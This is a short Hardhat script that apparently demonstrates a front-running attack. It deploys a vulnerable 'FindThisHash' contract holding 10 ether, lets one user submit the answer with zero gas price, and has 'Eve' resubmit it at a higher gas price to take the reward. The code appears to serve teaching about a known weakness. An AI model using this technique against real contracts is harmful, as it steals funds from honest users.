const { ethers } = require("hardhat");

async function main(){
    const [owner,Bob,Eve] = await ethers.getSigners();
    const Victim = await ethers.getContractFactory("FindThisHash");
    console.log("Deploying Victim...");
    const victim = await Victim.deploy({value:ethers.utils.parseEther("10.0")});
    console.log("Deployed")
    var options = { gasPrice: 0};
    victim.connect(Bob).solve("Ethereum",options);
    console.log("Bob has bid");
    var options = { gasPrice: 10000000000};
    await victim.connect(Eve).solve("Ethereum",options);
    console.log(await Eve.getBalance());

}
main().then(() => process.exit(0))
.catch(error => {
  console.error(error);
  process.exit(1);
});